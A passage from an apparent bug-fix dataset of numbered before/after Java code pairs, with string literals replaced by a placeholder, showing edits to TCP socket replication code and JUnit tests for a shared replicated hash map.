  map3.put(3,""String_Node_Str"");
  map4.put(4,""String_Node_Str"");
  waitTillEqual(5000);
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map2));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map3));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map4));
  assertTrue(""String_Node_Str"",!map2.isEmpty());
}","@Test public void test() throws IOException, InterruptedException {
  map1.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map3.remove(2);
  map3.put(3,""String_Node_Str"");
  map4.put(4,""String_Node_Str"");
  waitTillEqual(1000);
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map2));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map3));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map4));
  assertTrue(""String_Node_Str"",!map2.isEmpty());
}"
91359,"@Before public void setup() throws IOException {
  map1=newSocketShmIntString((byte)1,8076,new ClientPort(8077,""String_Node_Str""),new ClientPort(8078,""String_Node_Str""),new ClientPort(8079,""String_Node_Str""));
  map2=newSocketShmIntString((byte)2,8077,new ClientPort(8078,""String_Node_Str""),new ClientPort(8079,""String_Node_Str""));
  map3=newSocketShmIntString((byte)3,8078,new ClientPort(8079,""String_Node_Str""),new ClientPort(8077,""String_Node_Str""));
  map4=newSocketShmIntString((byte)4,8079,new ClientPort(8078,""String_Node_Str""),new ClientPort(8077,""String_Node_Str""));
}","@Before public void setup() throws IOException {
  map1=newSocketShmIntString((byte)1,8076,new ClientPort(8077,""String_Node_Str""),new ClientPort(8078,""String_Node_Str""),new ClientPort(8079,""String_Node_Str""));
  map2=newSocketShmIntString((byte)2,8077,new ClientPort(8078,""String_Node_Str""),new ClientPort(8079,""String_Node_Str""),new ClientPort(8076,""String_Node_Str""));
  map3=newSocketShmIntString((byte)3,8078,new ClientPort(8079,""String_Node_Str""),new ClientPort(8077,""String_Node_Str""),new ClientPort(8076,""String_Node_Str""));
  map4=newSocketShmIntString((byte)4,8079,new ClientPort(8078,""String_Node_Str""),new ClientPort(8077,""String_Node_Str""),new ClientPort(8076,""String_Node_Str""));
}"
91360,"@Test public void test() throws IOException, InterruptedException {
  map1.put(1,""String_Node_Str"");
  map1.put(2,""String_Node_Str"");
  map1.put(3,""String_Node_Str"");
  map2.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map1.remove(2);
  map2.remove(3);
  map1.remove(3);
  map2.put(5,""String_Node_Str"");
  waitTillEqual(5000);
  assertEquals(new TreeMap(map1),new TreeMap(map2));
  assertTrue(!map1.isEmpty());
}","@Test public void test() throws IOException, InterruptedException {
  map1.put(1,""String_Node_Str"");
  map1.put(2,""String_Node_Str"");
  map1.put(3,""String_Node_Str"");
  map2.put(5,""String_Node_Str"");
  map2.put(6,""String_Node_Str"");
  map1.remove(2);
  map2.remove(3);
  map1.remove(3);
  map2.put(5,""String_Node_Str"");
  waitTillEqual(5000);
  assertEquals(new TreeMap(map1),new TreeMap(map2));
  assertTrue(!map1.isEmpty());
}"
91361,"public ClientTcpSocketReplicator(@NotNull final ClientPort clientPort,@NotNull final SocketChannelEntryReader socketChannelEntryReader,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter,@NotNull final ReplicatedSharedHashMap map){
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"" + map.getIdentifier(),true)).execute(new Runnable(){
    @Override public void run(){
      try {
        SocketChannel socketChannel=null;
        for (; ; ) {
          try {
            socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
            LOG.info(""String_Node_Str"" + clientPort);
            socketChannel.socket().setReceiveBufferSize(8 * 1024);
            break;
          }
 catch (          ConnectException e) {
            if (socketChannel != null)             socketChannel.close();
            Thread.sleep(100);
          }
        }
        LOG.info(""String_Node_Str"" + map.getIdentifier());
        socketChannelRef.set(socketChannel);
        socketChannelEntryWriter.sendWelcomeMessage(socketChannel,map.lastModification(),map.getIdentifier());
        final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readWelcomeMessage(socketChannel);
        final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
        socketChannel.configureBlocking(false);
        final Selector selector=Selector.open();
        socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
        while (!isClosed.get()) {
          final int n=selector.select();
          if (n == 0) {
            continue;
          }
          final Iterator it=selector.selectedKeys().iterator();
          while (it.hasNext()) {
            SelectionKey key=(SelectionKey)it.next();
            it.remove();
            try {
              if (!key.isValid()) {
                continue;
              }
              if (key.isReadable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryReader.readAll(socketChannel0);
              }
              if (key.isWritable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
              }
            }
 catch (            Exception e) {
              if (!isClosed.get())               LOG.log(Level.SEVERE,""String_Node_Str"",e);
              try {
                key.channel().close();
              }
 catch (              IOException ex) {
              }
            }
          }
        }
      }
 catch (      Exception e) {
        if (!isClosed.get()) {
          LOG.log(Level.SEVERE,""String_Node_Str"",e);
        }
      }
    }
  }
);
}","public ClientTcpSocketReplicator(@NotNull final ClientPort clientPort,@NotNull final SocketChannelEntryReader socketChannelEntryReader,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter,@NotNull final ReplicatedSharedHashMap map){
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"" + map.getIdentifier(),true)).execute(new Runnable(){
    @Override public void run(){
      try {
        SocketChannel socketChannel=null;
        for (; ; ) {
          try {
            socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
            LOG.info(""String_Node_Str"" + clientPort);
            socketChannel.socket().setReceiveBufferSize(8 * 1024);
            break;
          }
 catch (          ConnectException e) {
            if (socketChannel != null)             socketChannel.close();
            Thread.sleep(100);
          }
        }
        LOG.info(""String_Node_Str"" + map.getIdentifier());
        socketChannelRef.set(socketChannel);
        socketChannelEntryWriter.sendBootstrap(socketChannel,map.lastModification(),map.getIdentifier());
        final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readWelcomeMessage(socketChannel);
        final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
        socketChannel.configureBlocking(false);
        final Selector selector=Selector.open();
        socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
        while (socketChannel.isOpen()) {
          final int n=selector.select();
          if (n == 0) {
            continue;
          }
          final Iterator it=selector.selectedKeys().iterator();
          while (it.hasNext()) {
            SelectionKey key=(SelectionKey)it.next();
            it.remove();
            try {
              if (!key.isValid()) {
                continue;
              }
              if (key.isReadable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryReader.readAll(socketChannel0);
              }
              if (key.isWritable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
              }
            }
 catch (            Exception e) {
              if (socketChannel.isOpen())               LOG.log(Level.SEVERE,""String_Node_Str"",e);
              try {
                key.channel().close();
              }
 catch (              IOException ex) {
              }
            }
          }
        }
      }
 catch (      Exception e) {
        final SocketChannel socketChannel=socketChannelRef.get();
        if (socketChannel != null && socketChannel.isOpen()) {
          LOG.log(Level.SEVERE,""String_Node_Str"",e);
        }
      }
    }
  }
);
}"
91362,"@Override public void run(){
  try {
    SocketChannel socketChannel=null;
    for (; ; ) {
      try {
        socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
        LOG.info(""String_Node_Str"" + clientPort);
        socketChannel.socket().setReceiveBufferSize(8 * 1024);
        break;
      }
 catch (      ConnectException e) {
        if (socketChannel != null)         socketChannel.close();
        Thread.sleep(100);
      }
    }
    LOG.info(""String_Node_Str"" + map.getIdentifier());
    socketChannelRef.set(socketChannel);
    socketChannelEntryWriter.sendWelcomeMessage(socketChannel,map.lastModification(),map.getIdentifier());
    final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readWelcomeMessage(socketChannel);
    final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
    remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
    if (bootstrap.identifier == map.getIdentifier())     throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
    LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
    socketChannel.configureBlocking(false);
    final Selector selector=Selector.open();
    socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
    while (!isClosed.get()) {
      final int n=selector.select();
      if (n == 0) {
        continue;
      }
      final Iterator it=selector.selectedKeys().iterator();
      while (it.hasNext()) {
        SelectionKey key=(SelectionKey)it.next();
        it.remove();
        try {
          if (!key.isValid()) {
            continue;
          }
          if (key.isReadable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryReader.readAll(socketChannel0);
          }
          if (key.isWritable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
          }
        }
 catch (        Exception e) {
          if (!isClosed.get())           LOG.log(Level.SEVERE,""String_Node_Str"",e);
          try {
            key.channel().close();
          }
 catch (          IOException ex) {
          }
        }
      }
    }
  }
 catch (  Exception e) {
    if (!isClosed.get()) {
      LOG.log(Level.SEVERE,""String_Node_Str"",e);
    }
  }
}","@Override public void run(){
  try {
    SocketChannel socketChannel=null;
    for (; ; ) {
      try {
        socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
        LOG.info(""String_Node_Str"" + clientPort);
        socketChannel.socket().setReceiveBufferSize(8 * 1024);
        break;
      }
 catch (      ConnectException e) {
        if (socketChannel != null)         socketChannel.close();
        Thread.sleep(100);
      }
    }
    LOG.info(""String_Node_Str"" + map.getIdentifier());
    socketChannelRef.set(socketChannel);
    socketChannelEntryWriter.sendBootstrap(socketChannel,map.lastModification(),map.getIdentifier());
    final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readWelcomeMessage(socketChannel);
    final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
    remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
    if (bootstrap.identifier == map.getIdentifier())     throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
    LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
    socketChannel.configureBlocking(false);
    final Selector selector=Selector.open();
    socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
    while (socketChannel.isOpen()) {
      final int n=selector.select();
      if (n == 0) {
        continue;
      }
      final Iterator it=selector.selectedKeys().iterator();
      while (it.hasNext()) {
        SelectionKey key=(SelectionKey)it.next();
        it.remove();
        try {
          if (!key.isValid()) {
            continue;
          }
          if (key.isReadable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryReader.readAll(socketChannel0);
          }
          if (key.isWritable()) {
            final SocketChannel socketChannel0=(SocketChannel)key.channel();
            socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
          }
        }
 catch (        Exception e) {
          if (socketChannel.isOpen())           LOG.log(Level.SEVERE,""String_Node_Str"",e);
          try {
            key.channel().close();
          }
 catch (          IOException ex) {
          }
        }
      }
    }
  }
 catch (  Exception e) {
    final SocketChannel socketChannel=socketChannelRef.get();
    if (socketChannel != null && socketChannel.isOpen()) {
      LOG.log(Level.SEVERE,""String_Node_Str"",e);
    }
  }
}"
91363,"@Override public void close() throws IOException {
  isClosed.set(true);
  final SocketChannel socketChannel=socketChannelRef.get();
  if (socketChannel != null)   socketChannel.close();
}","@Override public void close() throws IOException {
  final SocketChannel socketChannel=socketChannelRef.get();
  if (socketChannel != null)   socketChannel.close();
}"
91364,"/** 
 * binds to the server socket and process data This method will block until interrupted
 * @throws Exception
 */
private void process() throws Exception {
  LOG.info(""String_Node_Str"" + port);
  ServerSocket serverSocket=serverChannel.socket();
  Selector selector=Selector.open();
  serverSocket.setReuseAddress(true);
  serverSocket.bind(new InetSocketAddress(port));
  serverChannel.configureBlocking(false);
  serverChannel.register(selector,SelectionKey.OP_ACCEPT);
  while (!isClosed.get()) {
    final int n=selector.select();
    if (n == 0) {
      continue;
    }
    final Iterator it=selector.selectedKeys().iterator();
    while (it.hasNext()) {
      SelectionKey key=(SelectionKey)it.next();
      if (key.isAcceptable()) {
        final ServerSocketChannel server=(ServerSocketChannel)key.channel();
        final SocketChannel channel=server.accept();
        channel.configureBlocking(false);
        final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(entrySize,this.externalizable);
        final Bootstrap bootstrap=socketChannelEntryReader.readWelcomeMessage(channel);
        final ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        final Attached attached=new Attached(socketChannelEntryReader,remoteModificationIterator);
        channel.register(selector,SelectionKey.OP_WRITE | SelectionKey.OP_READ,attached);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        socketChannelEntryWriter.sendWelcomeMessage(channel,map.lastModification(),localIdentifier);
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
      }
      try {
        if (key.isWritable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          socketChannelEntryWriter.writeAll(socketChannel,attachment.remoteModificationIterator);
        }
        if (key.isReadable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          attachment.socketChannelEntryReader.readAll(socketChannel);
        }
      }
 catch (      Exception e) {
        LOG.log(Level.SEVERE,""String_Node_Str"",e);
        try {
          key.channel().close();
        }
 catch (        IOException ex) {
        }
      }
      it.remove();
    }
  }
}","/** 
 * binds to the server socket and process data This method will block until interrupted
 * @throws Exception
 */
private void process() throws Exception {
  LOG.info(""String_Node_Str"" + port);
  ServerSocket serverSocket=serverChannel.socket();
  Selector selector=Selector.open();
  serverSocket.setReuseAddress(true);
  serverSocket.bind(new InetSocketAddress(port));
  serverChannel.configureBlocking(false);
  serverChannel.register(selector,SelectionKey.OP_ACCEPT);
  while (!isClosed.get()) {
    final int n=selector.select();
    if (n == 0) {
      continue;
    }
    final Iterator it=selector.selectedKeys().iterator();
    while (it.hasNext()) {
      SelectionKey key=(SelectionKey)it.next();
      if (key.isAcceptable()) {
        final ServerSocketChannel server=(ServerSocketChannel)key.channel();
        final SocketChannel channel=server.accept();
        channel.configureBlocking(false);
        final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(entrySize,this.externalizable);
        final Bootstrap bootstrap=socketChannelEntryReader.readWelcomeMessage(channel);
        final ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        final Attached attached=new Attached(socketChannelEntryReader,remoteModificationIterator);
        channel.register(selector,SelectionKey.OP_WRITE | SelectionKey.OP_READ,attached);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        socketChannelEntryWriter.sendBootstrap(channel,map.lastModification(),localIdentifier);
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
      }
      try {
        if (key.isWritable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          socketChannelEntryWriter.writeAll(socketChannel,attachment.remoteModificationIterator);
        }
        if (key.isReadable()) {
          final SocketChannel socketChannel=(SocketChannel)key.channel();
          final Attached attachment=(Attached)key.attachment();
          attachment.socketChannelEntryReader.readAll(socketChannel);
        }
      }
 catch (      Exception e) {
        LOG.log(Level.SEVERE,""String_Node_Str"",e);
        try {
          key.channel().close();
        }
 catch (        IOException ex) {
        }
      }
      it.remove();
    }
  }
}"
91365,"Bootstrap readWelcomeMessage(SocketChannel channel) throws IOException {
  byteBuffer.clear();
  bytes.limit(0);
  bytes.position(0);
  while (bytes.remaining() < 9) {
    channel.read(byteBuffer);
    bytes.limit(byteBuffer.position());
  }
  return new Bootstrap(bytes.readByte(),bytes.readLong());
}","Bootstrap readWelcomeMessage(SocketChannel channel) throws IOException {
  while (bytes.remaining() < 9) {
    channel.read(byteBuffer);
    bytes.limit(byteBuffer.position());
  }
  return new Bootstrap(bytes.readByte(),bytes.readLong());
}"
91366,"public SocketChannelEntryReader(int entrySize,ReplicatedSharedHashMap.EntryExternalizable externalizable){
  this.entrySize0=entrySize;
  byteBuffer=ByteBuffer.allocate(entrySize0 * MAX_NUMBER_OF_ENTRIES_PER_BUFFER);
  this.externalizable=externalizable;
  bytes=new ByteBufferBytes(byteBuffer);
  byteBuffer.clear();
  bytes.limit(0);
  bytes.position(0);
}","public SocketChannelEntryReader(int entrySize,ReplicatedSharedHashMap.EntryExternalizable externalizable){
  this.entrySize0=entrySize;
  byteBuffer=ByteBuffer.allocate(entrySize0 * MAX_NUMBER_OF_ENTRIES_PER_BUFFER);
  this.externalizable=externalizable;
  bytes=new ByteBufferBytes(byteBuffer);
  bytes.limit(0);
  byteBuffer.clear();
}"
91367,"/** 
 * writes all the entries that have changed, to the tcp socket
 * @param socketChannel
 * @param modificationIterator
 * @throws InterruptedException
 * @throws java.io.IOException
 */
void writeAll(@NotNull final SocketChannel socketChannel,final ReplicatedSharedHashMap.ModificationIterator modificationIterator) throws InterruptedException, IOException {
  for (; ; ) {
    byteBuffer.limit(byteBuffer.capacity());
    boolean wasDataRead=false;
    try {
      wasDataRead=modificationIterator.nextEntry(entryCallback);
    }
 catch (    IndexOutOfBoundsException e) {
      e.printStackTrace();
      int i=1;
    }
    if (!wasDataRead && bytes.position() == 0)     return;
    if (bytes.remaining() > entryMaxSize && (wasDataRead || bytes.position() == 0))     continue;
    byteBuffer.limit((int)bytes.position());
    socketChannel.write(byteBuffer);
    if (byteBuffer.remaining() == 0) {
      byteBuffer.position(0);
      byteBuffer.limit(0);
    }
 else {
      byteBuffer.compact();
      byteBuffer.flip();
    }
    bytes.position(byteBuffer.limit());
    bytes.limit(bytes.capacity());
    return;
  }
}","/** 
 * writes all the entries that have changed, to the tcp socket
 * @param socketChannel
 * @param modificationIterator
 * @throws InterruptedException
 * @throws java.io.IOException
 */
void writeAll(@NotNull final SocketChannel socketChannel,final ReplicatedSharedHashMap.ModificationIterator modificationIterator) throws InterruptedException, IOException {
  final long start=bytes.position();
  for (; ; ) {
    if (start != 0)     Log.info(""String_Node_Str"");
    final boolean wasDataRead=modificationIterator.nextEntry(entryCallback);
    if (!wasDataRead && bytes.position() == start)     return;
    if (bytes.remaining() > entryMaxSize && (wasDataRead || bytes.position() == start))     continue;
    byteBuffer.limit((int)bytes.position());
    socketChannel.write(byteBuffer);
    if (byteBuffer.remaining() == 0) {
      byteBuffer.clear();
      bytes.clear();
    }
 else {
      byteBuffer.compact();
      byteBuffer.flip();
      bytes.limit(bytes.capacity());
      byteBuffer.limit(byteBuffer.capacity());
    }
    return;
  }
}"
91368,"@Test public void test() throws IOException, InterruptedException {
  map1.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map3.remove(2);
  map3.put(3,""String_Node_Str"");
  map4.put(4,""String_Node_Str"");
  waitTillEqual(1000);
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map2));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map3));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map4));
  assertTrue(""String_Node_Str"",!map2.isEmpty());
}","@Test public void test() throws IOException, InterruptedException {
  map1.put(1,""String_Node_Str"");
  map2.put(2,""String_Node_Str"");
  map3.put(3,""String_Node_Str"");
  map4.put(4,""String_Node_Str"");
  waitTillEqual(1000);
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map2));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map3));
  assertEquals(""String_Node_Str"",new TreeMap(map1),new TreeMap(map4));
  assertTrue(""String_Node_Str"",!map2.isEmpty());
}"
91369,"@Before public void setup() throws IOException {
  map1=newSocketShmIntString((byte)1,8076,new ClientPort(8077,""String_Node_Str""),new ClientPort(8078,""String_Node_Str""),new ClientPort(8079,""String_Node_Str""));
  map2=newSocketShmIntString((byte)2,8077,new ClientPort(8078,""String_Node_Str""),new ClientPort(8079,""String_Node_Str""),new ClientPort(8076,""String_Node_Str""));
  map3=newSocketShmIntString((byte)3,8078,new ClientPort(8079,""String_Node_Str""),new ClientPort(8077,""String_Node_Str""),new ClientPort(8076,""String_Node_Str""));
  map4=newSocketShmIntString((byte)4,8079,new ClientPort(8078,""String_Node_Str""),new ClientPort(8077,""String_Node_Str""),new ClientPort(8076,""String_Node_Str""));
}","@Before public void setup() throws IOException {
  map1=newSocketShmIntString((byte)1,8076,new ClientPort(8077,""String_Node_Str""),new ClientPort(8078,""String_Node_Str""),new ClientPort(8079,""String_Node_Str""));
  map2=newSocketShmIntString((byte)2,8077,new ClientPort(8078,""String_Node_Str""),new ClientPort(8079,""String_Node_Str""));
  map3=newSocketShmIntString((byte)3,8078,new ClientPort(8079,""String_Node_Str""));
  map4=newSocketShmIntString((byte)4,8079);
}"
91370,"static VanillaSharedReplicatedHashMap<Integer,CharSequence> newSocketShmIntString(final byte identifier,final int serverPort,ClientPort... clientSocketChannelProviderMaps) throws IOException {
  final VanillaSharedReplicatedHashMapBuilder builder=new VanillaSharedReplicatedHashMapBuilder().entries(1000).identifier(identifier);
  final VanillaSharedReplicatedHashMap<Integer,CharSequence> result=builder.create(getPersistenceFile(),Integer.class,CharSequence.class);
  final int adjustedEntrySize=result.maxEntrySize();
  final short maxNumberOfEntriesPerChunk=ServerTcpSocketReplicator.toMaxNumberOfEntriesPerChunk(1024 * 8,adjustedEntrySize);
  for (  ClientPort clientSocketChannelProvider : clientSocketChannelProviderMaps) {
    final SocketChannelEntryWriter socketChannelEntryWriter0=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
    final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(adjustedEntrySize,result);
    ClientTcpSocketReplicator clientTcpSocketReplicator=new ClientTcpSocketReplicator(clientSocketChannelProvider,socketChannelEntryReader,socketChannelEntryWriter0,result);
    result.addCloseable(clientTcpSocketReplicator);
  }
  final SocketChannelEntryWriter socketChannelEntryWriter=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
  ServerTcpSocketReplicator serverTcpSocketReplicator=new ServerTcpSocketReplicator(result,result,serverPort,socketChannelEntryWriter);
  result.addCloseable(serverTcpSocketReplicator);
  return result;
}","static VanillaSharedReplicatedHashMap<Integer,CharSequence> newSocketShmIntString(final byte identifier,final int serverPort,ClientPort... clientSocketChannelProviderMaps) throws IOException {
  final VanillaSharedReplicatedHashMapBuilder builder=new VanillaSharedReplicatedHashMapBuilder().entries(1000).identifier(identifier);
  final VanillaSharedReplicatedHashMap<Integer,CharSequence> result=builder.create(getPersistenceFile(),Integer.class,CharSequence.class);
  final int adjustedEntrySize=result.maxEntrySize();
  final short maxNumberOfEntriesPerChunk=ServerTcpSocketReplicator.toMaxNumberOfEntriesPerChunk(1024 * 8,adjustedEntrySize);
  for (  ClientPort clientSocketChannelProvider : clientSocketChannelProviderMaps) {
    final SocketChannelEntryWriter socketChannelEntryWriter0=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
    final SocketChannelEntryReader socketChannelEntryReader=new SocketChannelEntryReader(adjustedEntrySize,result);
    ClientTcpSocketReplicator clientTcpSocketReplicator=new ClientTcpSocketReplicator(clientSocketChannelProvider,socketChannelEntryReader,socketChannelEntryWriter0,result);
    result.addCloseable(clientTcpSocketReplicator);
  }
  final SocketChannelEntryWriter socketChannelEntryWriter=new SocketChannelEntryWriter(adjustedEntrySize,maxNumberOfEntriesPerChunk,result);
  final ServerTcpSocketReplicator serverTcpSocketReplicator=new ServerTcpSocketReplicator(result,result,serverPort,socketChannelEntryWriter);
  result.addCloseable(serverTcpSocketReplicator);
  return result;
}"
91371,"@After public void tearDown(){
  for (  final Closeable closeable : new Closeable[]{map1,map2,map3,map4}) {
    try {
      closeable.close();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
  }
}","@After public void tearDown() throws InterruptedException {
  for (  final Closeable closeable : new Closeable[]{map1,map2,map3,map4}) {
    try {
      closeable.close();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
  }
  Thread.sleep(100);
}"
91372,"public ClientTcpSocketReplicator(@NotNull final ClientPort clientPort,@NotNull final SocketChannelEntryReader socketChannelEntryReader,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter,@NotNull final ReplicatedSharedHashMap map){
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"" + map.getIdentifier(),true)).execute(new Runnable(){
    @Override public void run(){
      try {
        SocketChannel socketChannel=null;
        for (; ; ) {
          try {
            socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
            LOG.info(""String_Node_Str"" + clientPort);
            socketChannel.socket().setReceiveBufferSize(8 * 1024);
            break;
          }
 catch (          ConnectException e) {
            if (socketChannel != null)             socketChannel.close();
            Thread.sleep(100);
          }
        }
        LOG.info(""String_Node_Str"" + map.getIdentifier());
        socketChannelRef.set(socketChannel);
        socketChannelEntryWriter.sendBootstrap(socketChannel,map.lastModification(),map.getIdentifier());
        final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readBootstrap(socketChannel);
        final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
        socketChannel.configureBlocking(false);
        final Selector selector=Selector.open();
        socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
        while (socketChannel.isOpen()) {
          final int n=selector.select();
          if (n == 0) {
            continue;
          }
          final Iterator it=selector.selectedKeys().iterator();
          while (it.hasNext()) {
            SelectionKey key=(SelectionKey)it.next();
            it.remove();
            try {
              if (!key.isValid()) {
                continue;
              }
              if (key.isReadable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryReader.readAll(socketChannel0);
              }
              if (key.isWritable()) {
                final SocketChannel socketChannel0=(SocketChannel)key.channel();
                socketChannelEntryWriter.writeAll(socketChannel0,remoteModificationIterator);
              }
            }
 catch (            Exception e) {
              if (socketChannel.isOpen())               LOG.log(Level.SEVERE,""String_Node_Str"",e);
              try {
                key.channel().close();
              }
 catch (              IOException ex) {
              }
            }
          }
        }
      }
 catch (      Exception e) {
        final SocketChannel socketChannel=socketChannelRef.get();
        if (socketChannel != null && socketChannel.isOpen()) {
          LOG.log(Level.SEVERE,""String_Node_Str"",e);
        }
      }
    }
  }
);
}","public ClientTcpSocketReplicator(@NotNull final ClientPort clientPort,@NotNull final SocketChannelEntryReader socketChannelEntryReader,@NotNull final SocketChannelEntryWriter socketChannelEntryWriter,@NotNull final ReplicatedSharedHashMap map){
  newSingleThreadExecutor(new NamedThreadFactory(""String_Node_Str"" + map.getIdentifier(),true)).execute(new Runnable(){
    @Override public void run(){
      try {
        SocketChannel socketChannel=null;
        for (; ; ) {
          try {
            socketChannel=SocketChannel.open(new InetSocketAddress(clientPort.host,clientPort.port));
            LOG.info(""String_Node_Str"" + clientPort);
            socketChannel.socket().setReceiveBufferSize(8 * 1024);
            break;
          }
 catch (          ConnectException e) {
            if (socketChannel != null)             socketChannel.close();
            Thread.sleep(100);
          }
        }
        LOG.info(""String_Node_Str"" + map.getIdentifier());
        socketChannelRef.set(socketChannel);
        socketChannelEntryWriter.sendBootstrap(socketChannel,map.lastModification(),map.getIdentifier());
        final SocketChannelEntryReader.Bootstrap bootstrap=socketChannelEntryReader.readBootstrap(socketChannel);
        final ReplicatedSharedHashMap.ModificationIterator remoteModificationIterator=map.acquireModificationIterator(bootstrap.identifier);
        remoteModificationIterator.dirtyEntries(bootstrap.timeStamp);
        if (bootstrap.identifier == map.getIdentifier())         throw new IllegalStateException(""String_Node_Str"" + map.getIdentifier());
        LOG.info(""String_Node_Str"" + map.getIdentifier() + ""String_Node_Str""+ bootstrap.identifier);
        socketChannel.configureBlocking(false);
        final Selector selector=Selector.open();
        socketChannel.register(selector,SelectionKey.OP_READ | SelectionKey.OP_WRITE);
        while (socketChannel.isOpen()) {
          final int n=selector.select();
          if (n == 0) {
            continue;
          }
